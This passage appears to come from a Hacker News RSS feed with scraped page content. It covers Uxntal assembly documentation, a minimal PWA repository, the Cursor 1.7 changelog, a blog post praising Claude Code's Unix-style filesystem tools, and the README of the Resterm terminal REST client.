        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;0&lt;/cell&gt;
        &lt;cell&gt;0&lt;/cell&gt;
        &lt;cell&gt;0&lt;/cell&gt;
        &lt;cell&gt;0&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;By default, operators consume bytes from the working stack, notice how in the following example only the last two bytes &lt;code&gt;#45&lt;/code&gt; and &lt;code&gt;#67&lt;/code&gt;
are added, even if there are two shorts on the stack.&lt;/p&gt;
    &lt;code&gt;#1234 #4567 ADD12 34 ac&lt;/code&gt;
    &lt;p&gt;The short mode consumes two bytes from the stack. In the case of jump opcodes, the short-mode operation jumps to an absolute address in memory. For the memory accessing opcodes, the short mode operation indicates the size of the data to read and write.&lt;/p&gt;
    &lt;code&gt;#1234 #4567 ADD2 57 9b&lt;/code&gt;
    &lt;p&gt;The keep mode does not consume items from the stack, and pushes the result on top. Every opcode begins by popping values from the stack before operating on them. This mode keeps a copy of the stack pointer to recover after the popping stage.&lt;/p&gt;
    &lt;code&gt;#1234 #4567 ADD2k 12 34 45 67 57 9b&lt;/code&gt;
    &lt;p&gt;The return mode swaps the stacks on which an opcode operates. Under this mode, a return address will be pushed to the working stack, and stashing will take from the return stack. For that reason, there is no return opcode. For example, the &lt;code&gt;JSR&lt;/code&gt; opcode pushes the
return address onto the return stack, and &lt;code&gt;JMP2r&lt;/code&gt; jumps to that
address.&lt;/p&gt;
    &lt;code&gt;LITr 12 #34 STH ADDr STHr 46&lt;/code&gt;
    &lt;head rend="h3"&gt;Immediate opcodes&lt;/head&gt;
    &lt;p&gt;Immediate opcodes are operators that do not take items from the stack, but read values stored immediately after the opcode in the program's memory. Uxntal has 4 immediate opcodes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The literal LIT opcode, also written as #.&lt;/item&gt;
      &lt;item&gt;The jump !routine.&lt;/item&gt;
      &lt;item&gt;The conditional jump ?routine.&lt;/item&gt;
      &lt;item&gt;The subroutine routine.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The immediate jump opcodes are slightly faster than their standard opcode counterparts, but do not have modes and cannot be used to do pointer arithmetic. The address value of the immediate opcodes are stored in memory as relative shorts, enabling routines making use of these opcodes to be moved around in the program's memory.&lt;/p&gt;
    &lt;quote&gt;@on-reset ( -&amp;gt; ) #0007 fact BRK @fact ( n* -- res* ) ORAk ?{ POP2 #0001 JMP2r } DUP2 #0001 SUB2 fact MUL2 JMP2r&lt;/quote&gt;
    &lt;p&gt;To learn more about each opcode, see the Opcode Reference.&lt;/p&gt;
    &lt;head rend="h2"&gt;Uxntal Numbers&lt;/head&gt;
    &lt;p&gt;Uxntal uses only lowercase unsigned hexadecimal numbers of either 2 or 4 characters in length. There are two types of numbers:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A Literal Hex, like #ab, denotes a number that will be pushed on the stack when evaluated, it is made of a LIT opcode that matches its length, followed by a Raw Hex number.&lt;/item&gt;
      &lt;item&gt;A Raw Hex, like aa, is the standard textual encoding of data in a program, generally speaking these are more often loaded than evaluated. It can be anything, an opcode, an ascii byte, an address, part of a sprite.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;
#12 #34 LIT2 5678 ADD2 68 ac
&lt;/code&gt;
    &lt;head rend="h2"&gt;Uxntal Labels&lt;/head&gt;
    &lt;p&gt;A label is a non-numeric, non-opcode, and non-runic symbol that correspond to a number between 0 and 65536. A label name is made of two parts, a scope and a sublabel. Sublabels can be added to a scope with the &amp;amp;name rune, or by writing the full name, like @scope/name. Note that a labels like bed, add and cafe are considered numeric.&lt;/p&gt;
    &lt;p&gt;Functions are simply labels that will be jumped to, and returned from.&lt;/p&gt;
    &lt;quote&gt;@func ( a b -- c ) &amp;amp;loop INC GTHk ?&amp;amp;loop ADD JMP2r&lt;/quote&gt;
    &lt;p&gt;Constants are labels that hold a specific value through the entire execution of the program. They allow to assign a name to a number, making the code more readable.&lt;/p&gt;
    &lt;quote&gt;|1400 @limit&lt;/quote&gt;
    &lt;p&gt;Enums are labels with padded members of equal sizes that can be used as constants in a program, they typically begin by rolling back the program address with |00:&lt;/p&gt;
    &lt;quote&gt;|00 @Suit &amp;amp;clubs $1 &amp;amp;diamonds $1 &amp;amp;hearts $1 &amp;amp;spades&lt;/quote&gt;
    &lt;p&gt;Structs are labels with padded members of different sizes, that maps on a data-structure, they typically space the different members with $1:&lt;/p&gt;
    &lt;quote&gt;|00 @Person &amp;amp;name $2 &amp;amp;age $1 &amp;amp;height $2&lt;/quote&gt;
    &lt;p&gt;Labels can also be used with the padding runes to define a global length. For example, if one needs to specify a length of 0x30 for multiple members of a struct, a value can be specified as follow:&lt;/p&gt;
    &lt;quote&gt;|30 @length |00 @Struct &amp;amp;field $length&lt;/quote&gt;
    &lt;head rend="h3"&gt;Scope&lt;/head&gt;
    &lt;p&gt;Uxntal objects are defined statically and allow for the enclosed methods to access encapsulated local &amp;amp;members. The example below contains an object with the method set-color, accessible from outside the scope as pen/set-color.&lt;/p&gt;
    &lt;quote&gt;@pen &amp;amp;position &amp;amp;x $2 &amp;amp;y $2 &amp;amp;color $1 &amp;amp;set-color ( color -- ) ,/color STR JMP2r&lt;/quote&gt;
    &lt;p&gt;New methods and members can extend an existing scope from anywhere by creating a label with the scope name followed by a slash and the name of the extension. The &amp;amp;labels declared within the extension have the same access to local labels as the rest of the object.&lt;/p&gt;
    &lt;quote&gt;@pen/get-position ( -- x* y* ) ,/x LDR2 ,/y LDR2 JMP2r&lt;/quote&gt;
    &lt;p&gt;When calling local methods the scope's name can be omitted, starting at the slash, like /method:&lt;/p&gt;
    &lt;quote&gt;@pen/paint ( -- ) /get-position canvas/draw-line-to JMP2r&lt;/quote&gt;
    &lt;head rend="h3"&gt;Addressing&lt;/head&gt;
    &lt;p&gt;A labels is a way of assigning a name to a number. There are six ways to get the number corresponding to that label. Literal addressing prefixes the label with a &lt;code&gt;LIT&lt;/code&gt; for Relative and Zero-Page addressing, and
&lt;code&gt;LIT2&lt;/code&gt; for absolute addressing.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Literal Relative, like ,label, pushes a relative distance byte to the label.&lt;/item&gt;
      &lt;item&gt;Literal Zero-Page, like .label, pushes an absolute address byte to the label.&lt;/item&gt;
      &lt;item&gt;Literal Absolute, like ;label, pushes an absolute address short to the label.&lt;/item&gt;
      &lt;item&gt;Raw Relative, like _label, writes a relative distance byte to the label.&lt;/item&gt;
      &lt;item&gt;Raw Zero-Page, like -label, writes an absolute address byte to the label.&lt;/item&gt;
      &lt;item&gt;Raw Absolute, like =label, writes an absolute address short to the label.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Raw addressing is used for building data-structures and more advanced programs. A relatively common usage of raw runes is to create literals directly into the return stack:&lt;/p&gt;
    &lt;code&gt;
[ LIT2r 08 -label ] LDZr ADDr | [.label]+8
&lt;/code&gt;
    &lt;head rend="h3"&gt;Anonymous Labels&lt;/head&gt;
    &lt;p&gt;Anonymous labels are designated with a curly bracket that points to its associated closing bracket, and can be nested. Under the hood, the opening bracket assembles to the address of the closing bracket which allows the destination address to be used like any other label such as a JCI ?{, a JMI, !{ or a plain literal ;{. Here are some example data-structures:&lt;/p&gt;
    &lt;quote&gt;@counted-string _{ "foo 20 "bar } @linked-list ={ ={ "A } ={ "B ={ "C } } }&lt;/quote&gt;
    &lt;head rend="h4"&gt;Unless Blocks&lt;/head&gt;
    &lt;p&gt;It is important to notice that in the case of a conditional jump, the lambda's content is jumped over when the flag byte is true.&lt;/p&gt;
    &lt;quote&gt;[ LIT2 &amp;amp;last $1 -Mouse/state ] DEI DUP ,&amp;amp;last STR DUP2 #0001 NEQ2 ?{ ( on down ) } DUP2 #0101 NEQ2 ?{ ( on drag ) } DUP2 #0100 NEQ2 ?{ ( on release ) } POP2&lt;/quote&gt;
    &lt;p&gt;The opening curly bracket assembles to a unique label reference, and the closing bracket to a corresponding matching label definition. They do not affect the scope.&lt;/p&gt;
    &lt;head rend="h2"&gt;Uxntal Macros&lt;/head&gt;
    &lt;p&gt;A macro is a way of defining inline routines, it allows to create new words that will be replaced by the body of the macro, as opposed to a jump where the program counter will move to a routine and back, therefore it needs to be defined before its usage, as follow:&lt;/p&gt;
    &lt;quote&gt;%modulo ( num denum -- res ) { DIVk MUL SUB } @routine ( -- c* ) #18 #03 modulo JMP2r&lt;/quote&gt;
    &lt;p&gt;In the previous example, the token modulo will get replaced by the body of the macro during assembly:&lt;/p&gt;
    &lt;quote&gt;@routine ( -- c* ) #18 #03 DIVk MUL SUB JMP2r&lt;/quote&gt;
    &lt;head rend="h2"&gt;Uxntal Memory&lt;/head&gt;
    &lt;p&gt;There are 64kb of addressable memory. Roms are always loaded at 0x0100, which is the address of the Reset Vector and where evaluation begins. During boot, the stacks, device and addressable memories are zeroed. During a soft-reboot, the content of the zero-page is preserved.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;Shared&lt;/cell&gt;
        &lt;cell role="head"&gt;Memory&lt;/cell&gt;
        &lt;cell&gt;RAM&lt;/cell&gt;
        &lt;cell&gt;Data&lt;/cell&gt;
        &lt;cell&gt;64kb pages&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Private&lt;/cell&gt;
        &lt;cell&gt;Stacks&lt;/cell&gt;
        &lt;cell&gt;Working Stack&lt;/cell&gt;
        &lt;cell&gt;Data&lt;/cell&gt;
        &lt;cell&gt;256 bytes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Pointer&lt;/cell&gt;
        &lt;cell&gt;1 byte&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Return Stack&lt;/cell&gt;
        &lt;cell&gt;Data&lt;/cell&gt;
        &lt;cell&gt;256 bytes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Pointer&lt;/cell&gt;
        &lt;cell&gt;1 byte&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;IO&lt;/cell&gt;
        &lt;cell&gt;Devices&lt;/cell&gt;
        &lt;cell&gt;Data&lt;/cell&gt;
        &lt;cell&gt;256 bytes&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The device page and stacks are located outside of addressable memory.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;An Absolute Padding, like |100 moves the program generation to an address specified by a number or label.&lt;/item&gt;
      &lt;item&gt;A Relative Padding, like $18 moves the program generation by a distance specified by a number or label.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;
|18 @width

|100 @on-reset ( -&amp;gt; )
	;buffer/end BRK 02 18

|200 @buffer $width &amp;amp;end
&lt;/code&gt;
    &lt;p&gt;Memory is big-endian, when writing or reading a short from memory, the position is that of the high-byte. The low-byte of a short written at 0xffff wraps to 0x0000.&lt;/p&gt;
    &lt;quote&gt;#12 #0200 STA 0x0200=12 #3456 #0400 STA2 0x0400=34, 0x0401=56 #0400 LDA 34&lt;/quote&gt;
    &lt;p&gt;The zero-page is the memory located below 0x0100, its purpose is to store variables that will be accessed often, or needs to be preserved across a soft-reboot. It is sligthly faster to read and write from the zero-page using the LDZ and STZ opcodes as they use only a single byte instead of a short. This memory space cannot be pre-filled in the rom prior to initialization. The low-byte of a short written at 0xff wraps to 0x00.&lt;/p&gt;
    &lt;quote&gt;#1234 #80 STZ2 0x0080=12, 0x0081=34 #81 LDZ 34&lt;/quote&gt;
    &lt;head rend="h2"&gt;Uxntal Devices&lt;/head&gt;
    &lt;p&gt;Uxn is non-interruptible, vectors are locations in programs that are evaluated when certain events occur. A vector is evaluated until a BRK opcode is encountered. Uxn can communicate with a maximum of 16 devices, each device has 16 ports, each port handles a specific I/O message. Ports are mapped to the devices memory page, which is located outside of the main addressable memory.&lt;/p&gt;
    &lt;p&gt;All programs begin by executing the reset vector located at &lt;code&gt;0x100&lt;/code&gt;. The content of the stacks are preserved between vectors,
but it is discouraged to use the stacks to pass data between vectors.&lt;/p&gt;
    &lt;quote&gt;@on-reset ( -&amp;gt; ) ( set vector ) ;on-mouse .Mouse/vector DEO2 BRK @on-mouse ( -&amp;gt; ) ( read state ) .Mouse/state DEI ?&amp;amp;on-touch BRK &amp;amp;on-touch ( -&amp;gt; ) ( A mouse button is pressed ) BRK&lt;/quote&gt;
    &lt;p&gt;For example, the address stored in the Mouse/vector ports points to a part of the program to be evaluated when the cursor is moved, or a button state has changed.&lt;/p&gt;
    &lt;head rend="h2"&gt;Uxntal Utilities&lt;/head&gt;
    &lt;p&gt;Here's a list of small self-hosted development tools:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Drifblim is an assembler that also emits a symbols file.&lt;/item&gt;
      &lt;item&gt;Uxnfor is a formatter that standardize the source code, this is the formatting style used across the Uxntal documentation.&lt;/item&gt;
      &lt;item&gt;Uxnlin is a peephole optimizer that reveals potential optimizations in opcode sequences.&lt;/item&gt;
      &lt;item&gt;Uxnbal is a program validator that warns when routines do not match their definitions.&lt;/item&gt;
      &lt;item&gt;Uxndis is a disassembler that prints the opcodes in a rom file.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;incoming: left noodle drifblim theme catclock oquonie bifurcan yufo programming languages concatenative gly format ufx format ulz format proquints brainfuck uxn uxntal reference uxntal alphabet bicycle beetbug arvelie about oscean computer 2025 2021&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45437323</guid><pubDate>Wed, 01 Oct 2025 13:14:32 +0000</pubDate></item><item><title>Minimal files and config for a PWA</title><link>https://github.com/chr15m/minimal-pwa</link><description>&lt;doc fingerprint="17eaf10100997cb2"&gt;
  &lt;main&gt;
    &lt;p&gt;This is the minimal set of files for a "progressive web app" to be installable on Android and iOS.&lt;/p&gt;
    &lt;p&gt;It contains the smallest possible &lt;code&gt;manifest.json&lt;/code&gt; and service worker to trigger the install flow on Chrome.&lt;/p&gt;
    &lt;p&gt;An even smaller implementation that fits in a single HTML file is in single-file-pwa.html. It has a manifest.json that is dynamically generated from JavaScript, and it is installable without a service worker.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45437326</guid><pubDate>Wed, 01 Oct 2025 13:14:48 +0000</pubDate></item><item><title>Show HN: ChartDB Agent – Cursor for DB schema design</title><link>https://app.chartdb.io/ai</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=45437594</guid><pubDate>Wed, 01 Oct 2025 13:38:36 +0000</pubDate></item><item><title>Cursor 1.7</title><link>https://cursor.com/changelog/1-7</link><description>&lt;doc fingerprint="ef16a358a5cbb834"&gt;
  &lt;main&gt;
    &lt;p&gt;1.7 · Changelog&lt;/p&gt;
    &lt;head rend="h1"&gt;Agent Autocomplete, Hooks, and Team Rules&lt;/head&gt;
    &lt;head rend="h3"&gt;Autocomplete for Agent&lt;/head&gt;
    &lt;p&gt;When writing prompts, autocomplete suggestions will appear based on recent changes. Tab to accept suggestions and attach files to context.&lt;/p&gt;
    &lt;head rend="h3"&gt;Hooks (beta)&lt;/head&gt;
    &lt;p&gt;You can now observe, control, and extend the Agent loop using custom scripts. Hooks give you a way to customize and influence Agent behavior at runtime.&lt;/p&gt;
    &lt;p&gt;Use Hooks to audit Agent usage, block commands, or redact secrets from context. It's still in beta and we'd love to hear your feedback.&lt;/p&gt;
    &lt;head rend="h3"&gt;Team rules&lt;/head&gt;
    &lt;p&gt;Teams can now define and share global rules from the dashboard that will be applied to all projects. We’ve also shipped team rules for Bugbot, so behavior is consistent across repos.&lt;/p&gt;
    &lt;head rend="h3"&gt;Share prompts with deeplinks (beta)&lt;/head&gt;
    &lt;p&gt;Generate shareable deeplinks for reusable prompts. Useful for setup instructions in documentation, team resources, and sharing workflows. See our documentation for how to create them.&lt;/p&gt;
    &lt;head rend="h3"&gt;Monitor Agents from menubar&lt;/head&gt;
    &lt;p&gt;Quickly check the status of Cursor Agents right from your menubar.&lt;/p&gt;
    &lt;head rend="h3"&gt;Image file support for Agent&lt;/head&gt;
    &lt;p&gt;Agent can now read image files directly from your workspace and include them in context. Previously, only pasted images were supported.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45437735</guid><pubDate>Wed, 01 Oct 2025 13:51:03 +0000</pubDate></item><item><title>Unix philosophy and filesystem access makes Claude Code amazing</title><link>https://www.alephic.com/writing/the-magic-of-claude-code</link><description>&lt;doc fingerprint="370009d837378e9b"&gt;
  &lt;main&gt;
    &lt;p&gt;Noah Brier, September 30, 2025&lt;/p&gt;
    &lt;p&gt;If you've talked to me lately about AI, you've almost certainly been subject to a long soliloquy about the wonders of Claude Code. What started as a tool I ran in parallel with other tools to aid coding has turned into my full-fledged agentic operating system, supporting all kinds of workflows.&lt;/p&gt;
    &lt;p&gt;Most notably, Obsidian, the tool I use for note-taking. The difference between Obsidian and Notion or Evernote is that all the files are just plain old Markdown files stored on your computer. You can sync, style, and save them, but ultimately, it's still a text file on your hard drive. A few months ago, I realized that this fact made my Obsidian notes and research a particularly interesting target for AI coding tools. What first started with trying to open my vault in Cursor quickly moved to a sort of note-taking operating system that I grew so reliant on, I ended up standing up a server in my house so I could connect via SSH from my phone into my Claude Code + Obsidian setup and take notes, read notes, and think through things on the go.&lt;/p&gt;
    &lt;p&gt;A few weeks ago, I went on Dan Shipper's AI &amp;amp; I Podcast to wax poetic about my love for this setup. I did a pretty deep dive into the system I use, how it works, why it works, etc. I won't retread all those details—you can read the transcript or listen to the podcast—but I want to talk about a few other things related to Claude Code that I've come to realize since the conversation.&lt;/p&gt;
    &lt;p&gt;I've really struggled to answer this question. I'm also not sure it's better than Cursor for all things, but I do think there are a set of fairly exceptional pieces that work together in concert to make me turn to Claude Code whenever I need to build anything these days. Increasingly, that's not even about applying it to existing codebases as much as it's building entirely new things on top of its functionality (more on that in a bit).&lt;/p&gt;
    &lt;p&gt;So what's the secret? Part of it lies in how Claude Code approaches tools. As a terminal-based application, it trades accessibility for something powerful: native Unix command integration. While I typically avoid long blockquotes, the Unix Philosophy deserves an exception—Doug McIlroy's original formulation captures it perfectly:&lt;/p&gt;
    &lt;p&gt;The Unix philosophy is documented by Doug McIlroy in the Bell System Technical Journal from 1978:&lt;/p&gt;
    &lt;p&gt;It was later summarized by Peter H. Salus in A Quarter-Century of Unix (1994):&lt;/p&gt;
    &lt;p&gt;These fifty-year-old principles are exactly how LLMs want to use tools. If you look at how these models actually use the tools they're given, they are constantly "piping" output to input (albeit using their own fuzziness in between). (As an aside, the Unix | command allows you to string the output from one command into the input of another.) When models fail to weld their tools effectively, it is almost always because the tools are overly complex.&lt;/p&gt;
    &lt;p&gt;So part one of why Claude Code can be so mind-blowing is that the commands that power Unix happen to be perfectly suited for use by LLMs. This is both because they're simple and also incredibly well-documented, meaning the models had ample source material to teach them the literal ins and outs.&lt;/p&gt;
    &lt;p&gt;But that still wasn't the whole thing. The other piece was obviously Claude Code's ability to write code initially and, more recently, prose (for me, at least). But while other applications like ChatGPT and Claude can write output, there was something different going on here. Last week, while reading The Pragmatic Engineer's deep dive into how Claude Code is built. The answer was staring me in the face: filesystem access.&lt;/p&gt;
    &lt;p&gt;The filesystem changes everything. ChatGPT and Claude in the browser have two fatal flaws: no memory between conversations and a cramped context window. A filesystem solves both. Claude Code writes notes to itself, accumulates knowledge, and keeps running tallies. It has state and memory. It can think beyond a single conversation.&lt;/p&gt;
    &lt;p&gt;Back in 2022, when I first played with the GPT-3 API, I said that even if models never got better than they were in that moment, we would still have a decade to discover the use cases. They did get better—reasoning models made tool calling reliable—but the filesystem discovery proves my point.&lt;/p&gt;
    &lt;p&gt;I bring this up because in the Pragmatic Engineer interview, Boris Cherney, who built the initial version of Claude Code, uses it to describe the aha:&lt;/p&gt;
    &lt;p&gt;In AI, we talk about “product overhang”, and this is what we discovered with the prototype. Product overhang means that a model is able to do a specific thing, but the product that the AI runs in isn’t built in a way that captures this capability. What I discovered about Claude exploring the filesystem was pure product overhang. The model could already do this, but there wasn’t a product built around this capability!&lt;/p&gt;
    &lt;p&gt;Again, I'd argue it's filesystem + Unix commands, but the point is that the capability was there in the model just waiting to be woken up, and once it was, we were off to the races. Claude Code works as a blueprint for building reliable agentic systems because it captures model capabilities instead of limiting them through over-engineered interfaces.&lt;/p&gt;
    &lt;p&gt;I talked about my Claude Code + Obsidian setup, and I've actually taken it a step further by open-sourcing "Claudesidian," which pulls in a bunch of the tools and commands I use in my own Claude Code + Obsidian setup. It also goes beyond that and was a fun experimental ground for me. Most notably, I built an initial upgrade tool so that if changes are made centrally, you can pull them into your own Claudesidian, and the AI will help you check to see if you've made changes to the files being updated and, if so, attempt to smartly merge your changes with the new updates. Both projects follow the same Unix philosophy principles—simple, composable tools that do one thing well and work together. This is the kind of stuff that Claude Code makes possible, and why it's so exciting for me as a new way of building applications.&lt;/p&gt;
    &lt;p&gt;Speaking of which, one I'm not quite ready to release, but hopefully will be soon, is something I've been calling "Inbox Magic," though I'll surely come up with a better name. It's a Claude Code repo with access to a set of Gmail tools and a whole bunch of prompts and commands to effectively start operating like your own email EA. Right now, the functionality is fairly simple: it can obviously run searches or send emails on your behalf, but it can also do things like triage and actually run a whole training run on how you sound over email so it can more effectively draft emails for you. While Claude Code and ChatGPT both have access to my emails, they mostly grab one or two at a time. This system, because it can write things out to files and do lots of other fancy tricks, can perform a task like “find every single travel-related email in my inbox and use that to build a profile of my travel habits that I can use as a prompt to help ChatGPT/Claude do travel research that's actually aligned with my preferences.” Anyway, more on this soon, and if it's something you want to try out, ping me with your GitHub username, and as soon as I feel like I have something ready to test, I'll happily share it.&lt;/p&gt;
    &lt;p&gt;While I generally shy away from conclusions, I think there are a few here worth reiterating.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45437893</guid><pubDate>Wed, 01 Oct 2025 14:05:45 +0000</pubDate></item><item><title>Show HN: Resterm – A terminal-based REST/GraphQL and gRPC client</title><link>https://github.com/unkn0wn-root/resterm</link><description>&lt;doc fingerprint="be0d79587ea9820b"&gt;
  &lt;main&gt;
    &lt;p&gt;a terminal-based REST client.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Workspace explorer. Filters &lt;code&gt;.http&lt;/code&gt;/&lt;code&gt;.rest&lt;/code&gt;files, respects workspace roots, and keeps the file pane navigable with incremental search.&lt;/item&gt;
      &lt;item&gt;Editor with modal workflow. Starts in view mode, supports Vim-style motions, visual selections with inline highlighting, clipboard yank/cut, &lt;code&gt;Shift+F&lt;/code&gt;search, and an&lt;code&gt;i&lt;/code&gt;/&lt;code&gt;Esc&lt;/code&gt;toggle for insert mode.&lt;/item&gt;
      &lt;item&gt;Inline requests. Type &lt;code&gt;https://api.example.com&lt;/code&gt;or&lt;code&gt;GET https://api.example.com&lt;/code&gt;directly in the editor and press&lt;code&gt;Ctrl+Enter&lt;/code&gt;- no&lt;code&gt;.http&lt;/code&gt;/&lt;code&gt;.rest&lt;/code&gt;file required.&lt;/item&gt;
      &lt;item&gt;Curl command parsing (limited). supports basic &lt;code&gt;curl&lt;/code&gt;invocations (method, headers, data flags) - more in the road-map.&lt;/item&gt;
      &lt;item&gt;Status-aware response pane. Pill-style header calls out workspace, environment, active request, and script/test outcomes; response tabs cover Pretty, Raw, Headers, and History, plus request previews.&lt;/item&gt;
      &lt;item&gt;Auth &amp;amp; variable helpers. &lt;code&gt;@auth&lt;/code&gt;directives cover basic, bearer, API key, and custom headers; variable resolution spans request, file, environment, and OS layers with helpers like&lt;code&gt;{{$timestamp}}&lt;/code&gt;and&lt;code&gt;{{$uuid}}&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Pre-request &amp;amp; test scripting. JavaScript (goja) hooks mutate outgoing requests, assert on responses, and surface pass/fail summaries inline.&lt;/item&gt;
      &lt;item&gt;GraphQL tooling. &lt;code&gt;@graphql&lt;/code&gt;and&lt;code&gt;@variables&lt;/code&gt;directives produce proper payloads, attach operation names, and keep previews/history readable.&lt;/item&gt;
      &lt;item&gt;gRPC client. &lt;code&gt;GRPC host:port&lt;/code&gt;requests with&lt;code&gt;@grpc&lt;/code&gt;metadata build messages from descriptor sets or reflection, stream metadata/trailers, and log history entries beside HTTP calls.&lt;/item&gt;
      &lt;item&gt;Session persistence. Cookie jar, history store, and environment-aware entries survive restarts; &lt;code&gt;@no-log&lt;/code&gt;can redact bodies.&lt;/item&gt;
      &lt;item&gt;Configurable transport. Flag-driven timeout, TLS, redirect, and proxy settings alongside environment file discovery (&lt;code&gt;resterm.env.json&lt;/code&gt;or legacy&lt;code&gt;rest-client.env.json&lt;/code&gt;).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Warning&lt;/p&gt;
    &lt;p&gt;Resterm is still in early stages so bugs and undesired behaviors can be expected.&lt;/p&gt;
    &lt;p&gt;Resterm reads plain-text &lt;code&gt;.http&lt;/code&gt;/&lt;code&gt;.rest&lt;/code&gt; files. Each request follows the same conventions so the editor, parser, and history can reason about it consistently.&lt;/p&gt;
    &lt;code&gt;### get user
# @name getUser
# @description Fetch a user profile
GET https://{{baseUrl}}/users/{{userId}}
Authorization: Bearer {{token}}
X-Debug: {{$timestamp}}

{
  "verbose": true
}

### create user
POST https://{{baseUrl}}/users
Content-Type: application/json

&amp;lt; ./payloads/create-user.json&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Request separators. Start a new request with a line beginning &lt;code&gt;###&lt;/code&gt;(an optional label after the hashes is ignored by the parser but is handy for readability).&lt;/item&gt;
      &lt;item&gt;Metadata directives. Comment lines (&lt;code&gt;#&lt;/code&gt;or&lt;code&gt;//&lt;/code&gt;) before the request line can include directives such as&lt;code&gt;@name&lt;/code&gt;,&lt;code&gt;@description&lt;/code&gt;,&lt;code&gt;@tag&lt;/code&gt;,&lt;code&gt;@auth&lt;/code&gt;,&lt;code&gt;@graphql&lt;/code&gt;,&lt;code&gt;@grpc&lt;/code&gt;,&lt;code&gt;@variables&lt;/code&gt;, and&lt;code&gt;@script&lt;/code&gt;. See Request Metadata &amp;amp; Settings for the full list.&lt;/item&gt;
      &lt;item&gt;Request line. The first non-comment line specifies the verb and target. HTTP calls use &lt;code&gt;&amp;lt;METHOD&amp;gt; &amp;lt;URL&amp;gt;&lt;/code&gt;, whereas gRPC calls begin with&lt;code&gt;GRPC host:port&lt;/code&gt;followed by&lt;code&gt;@grpc package.Service/Method&lt;/code&gt;metadata.&lt;/item&gt;
      &lt;item&gt;Headers. Subsequent lines of the form &lt;code&gt;Header-Name: value&lt;/code&gt;are sent verbatim after variable substitution.&lt;/item&gt;
      &lt;item&gt;Body. A blank line separates headers from the body. You can inline JSON/text, use heredoc-style scripts, or include external files with &lt;code&gt;&amp;lt; ./path/to/file&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Inline variables. Placeholders like &lt;code&gt;{{userId}}&lt;/code&gt;or&lt;code&gt;{{token}}&lt;/code&gt;are resolved using the variable stack (request variables, file-level variables, selected environment, then OS environment). Helpers such as&lt;code&gt;{{$uuid}}&lt;/code&gt;and&lt;code&gt;{{$timestamp}}&lt;/code&gt;are available out of the box.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# build the binary
go build ./cmd/resterm

# run with a sample file
./resterm --file examples/basic.http&lt;/code&gt;
    &lt;p&gt;By default &lt;code&gt;resterm&lt;/code&gt; scans the opened file’s directory (or the current working directory) for request files. Use &lt;code&gt;--workspace&lt;/code&gt; to pick a different root:&lt;/p&gt;
    &lt;code&gt;./resterm --workspace ./samples --file samples/basic.http&lt;/code&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Action&lt;/cell&gt;
        &lt;cell role="head"&gt;Shortcut&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Cycle focus between panes&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;Tab&lt;/code&gt; / &lt;code&gt;Shift+Tab&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Send active editor request&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;Ctrl+Enter&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Run selected request from the palette&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;Enter&lt;/code&gt; (Requests list)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Preview selected request in the editor&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;Space&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Toggle editor insert mode&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;i&lt;/code&gt; (enter insert) / &lt;code&gt;Esc&lt;/code&gt; (return to view)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Toggle help overlay&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;?&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
